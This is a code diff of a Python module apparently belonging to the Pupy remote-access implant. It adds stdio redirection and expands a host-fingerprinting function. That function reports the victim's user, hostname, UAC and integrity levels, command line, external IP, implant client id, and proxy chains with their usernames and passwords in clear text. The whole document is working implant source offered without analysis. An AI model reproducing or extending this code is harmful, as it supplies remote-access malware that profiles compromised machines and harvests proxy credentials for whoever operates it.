@@ -6,12 +6,73 @@ import uuid
 import sys
 import os
 import locale
+import logging
+import socket
+import pupy
+
+import encodings
+
+# Restore write/stdout/stderr
+
+if not hasattr(os, 'real_write'):
+    if type(os.write).__name__ == 'builtin_function_or_method':
+        os.real_write = os.write
+
+allowed_std = ('file', 'Blackhole', 'NoneType')
+
+if not hasattr(sys, 'real_stdout') and type(sys.stdout).__name__ in allowed_std:
+    sys.real_stdout = sys.stdout
+
+if not hasattr(sys, 'real_stderr') and type(sys.stderr).__name__ in allowed_std:
+    sys.real_stderr = sys.stderr
+
+if not hasattr(sys, 'real_stdin') and type(sys.stdin).__name__ in allowed_std:
+    sys.real_stdin = sys.stdin
+
+if not hasattr(os, 'stdout_write'):
+    def stdout_write(fd, s):
+        if fd == 1:
+            return sys.stdout.write(s)
+        elif fd == 2:
+            return sys.stderr.write(s)
+        else:
+            return os.real_write(fd, s)
+
+    os.stdout_write = stdout_write
+
+# Remove IDNA module if it was not properly loaded
+if hasattr(encodings, 'idna') and not hasattr(encodings.idna, 'getregentry'):
+    if 'encodings.idna' in sys.modules:
+        del sys.modules['encodings.idna']
+
+    if 'idna' in encodings._cache:
+        del encodings._cache['idna']
 
 os_encoding = locale.getpreferredencoding() or "utf8"
 
 if sys.platform == 'win32':
-    from _winreg import *
+    from _winreg import (
+        ConnectRegistry, HKEY_LOCAL_MACHINE, OpenKey, EnumValue
+    )
     import ctypes
+
+def redirect_stdo(stdout, stderr):
+    sys.stdout = stdout
+    sys.stderr = stderr
+    os.write = os.stdout_write
+
+def redirect_stdio(stdin, stdout, stderr):
+    sys.stdin = stdin
+    redirect_stdo(stdout, stderr)
+
+def reset_stdo():
+    sys.stdout = sys.real_stdout
+    sys.stderr = sys.real_stderr
+    os.write = os.real_write
+
+def reset_stdio():
+    sys.stdin = sys.real_stdin
+    reset_stdo()
 
 def get_integrity_level():
     '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''
@@ -130,7 +191,7 @@ def getUACLevel():
     i, consentPromptBehaviorAdmin, enableLUA, promptOnSecureDesktop = 0, None, None, None
     try:
         Registry = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
-        RawKey = OpenKey(Registry, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
+        RawKey = OpenKey(Registry, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
     except:
         return "?"
     while True:
@@ -159,36 +220,50 @@ def getUACLevel():
 
 def GetUserName():
     from ctypes import windll, WinError, create_unicode_buffer, byref, c_uint32, GetLastError
+
     DWORD = c_uint32
     nSize = DWORD(0)
-    windll.advapi32.GetUserNameW(None, byref(nSize))
+    windll.secur32.GetUserNameExW(2, None, byref(nSize))
     error = GetLastError()
-
     ERROR_INSUFFICIENT_BUFFER = 122
-    if error != ERROR_INSUFFICIENT_BUFFER:
+    ERROR_MORE_DATA_AVAILABLE = 234
+
+    if error not in (ERROR_INSUFFICIENT_BUFFER, ERROR_MORE_DATA_AVAILABLE):
         raise WinError(error)
 
     lpBuffer = create_unicode_buffer('', nSize.value + 1)
+    nSize = DWORD(nSize.value + 1)
+    success = windll.secur32.GetUserNameExW(2, lpBuffer, byref(nSize))
 
-    success = windll.advapi32.GetUserNameW(lpBuffer, byref(nSize))
     if not success:
-        raise WinError()
+        raise WinError(GetLastError())
 
     return lpBuffer.value
 
 def get_uuid():
-    user=None
-    node=None
-    plat=None
-    release=None
-    version=None
-    machine=None
-    macaddr=None
-    pid=None
-    proc_arch=None
-    proc_path=sys.executable
+    user = None
+    hostname = None
+    node = None
+    plat = None
+    release = None
+    version = None
+    machine = None
+    macaddr = None
+    pid = None
+    proc_arch = None
+    proc_path = sys.executable
+    cmdline = None
+
+    if hasattr(sys, 'real_argv'):
+        cmdline = ' '.join(sys.real_argv)
+    elif sys.argv:
+        cmdline = ' '.join(sys.argv)
+    else:
+        cmdline = proc_path
+
     uacLevel = None
     integrity_level = None
+
     try:
         if sys.platform=="win32":
             user = GetUserName().encode("utf8")
@@ -197,13 +272,24 @@ def get_uuid():
                 encoding=os_encoding
             ).encode("utf8")
     except Exception as e:
-        user=str(e)
+        logging.exception(e)
+        user='?'
+
+    try:
+        hostname = platform.node().decode(
+            encoding=os_encoding
+        ).encode("utf8")
+
+        if sys.platform == 'win32' and user.startswith(hostname + '\\'):
+            user = user.split('\\', 1)[1]
+
+    except Exception:
         pass
 
     try:
-        node = platform.node().decode(
-            encoding=os_encoding
-        ).encode("utf8")
+        hostname = socket.getfqdn().lower()
+        if hostname.endswith(('.localdomain', '.localhost')):
+            hostname, _ = hostname.rsplit('.', 1)
     except Exception:
         pass
 
@@ -213,7 +299,33 @@ def get_uuid():
         pass
 
     try:
-        plat=platform.system()
+        plat = platform.system()
+        if plat == 'Java':
+            # Jython!
+            if hasattr(sys, 'system_java'):
+                plat = sys.system_java
+            else:
+                jsystem = sys.platform.getshadow()
+
+                # Fix this crap
+                setattr(sys, 'platform', jsystem)
+
+                if jsystem == 'linux2':
+                    plat = 'Linux+Java'
+                elif jsystem == 'win32':
+                    plat = 'Windows+Java'
+                else:
+                    plat = jsystem + '+Java'
+
+                setattr(sys, 'system_java', plat)
+
+                import ctypes.util
+                plat += '+JyNI'
+
+                setattr(sys, 'system_java', plat)
+
+                del ctypes.util
+
     except Exception:
         pass
 
@@ -248,8 +360,8 @@ def get_uuid():
         pass
 
     try:
-        macaddr=uuid.getnode()
-        macaddr=':'.join(("%012X" % macaddr)[i:i+2] for i in range(0, 12, 2))
+        node = '{:012x}'.format(uuid.getnode())
+        macaddr = ':'.join(node[i:i+2] for i in range(0, 12, 2))
     except Exception:
         pass
 
@@ -263,18 +375,69 @@ def get_uuid():
     except Exception as e:
         integrity_level = "?"
 
+    try:
+        if hasattr(pupy, 'cid'):
+            cid = pupy.cid
+        elif hasattr(pupy, 'client'):
+            cid = pupy.client.cid
+    except:
+        cid = None
+
+    proxy = None
+    try:
+        from network.lib.proxies import LAST_PROXY, has_wpad
+        if hasattr(pupy, 'client') and pupy.client.connection_info.get(
+                'proxies', []):
+            try:
+                proxy = ' -> '.join(
+                    '{}://{}{}'.format(
+                        proxy.type,
+                        '{}:{}@'.format(
+                            proxy.username, proxy.password
+                        ) if proxy.username or proxy.password else '',
+                        proxy.addr
+                    ) for proxy in pupy.client.connection_info['proxies']
+                )
+            except Exception as e:
+                proxy = str(e)
+
+        elif LAST_PROXY:
+            proxy = tuple([
+                x for x in LAST_PROXY if x
+            ])
+        elif has_wpad:
+            proxy = 'wpad'
+
+    except ImportError:
+        proxy = None
+
+    try:
+        external_ip = None
+
+        from network.lib.online import LAST_EXTERNAL_IP
+        if LAST_EXTERNAL_IP:
+            external_ip = str(LAST_EXTERNAL_IP)
+    except ImportError:
+        external_ip = None
+
     return {
         'user': user,
-        'hostname': node,
+        'hostname': hostname,
+        'node': node,
         'platform': plat,
         'release': release,
         'version': version,
         'os_arch': machine,
         'os_name': osname,
+        'node': node,
         'macaddr': macaddr,
         'pid': pid,
         'proc_arch': proc_arch,
         'exec_path': proc_path,
+        'cmdline': cmdline,
         'uac_lvl': uacLevel,
-        'intgty_lvl': integrity_level
+        'intgty_lvl': integrity_level,
+        'cid': cid,
+        'proxy': proxy,
+        'external_ip': external_ip
     }
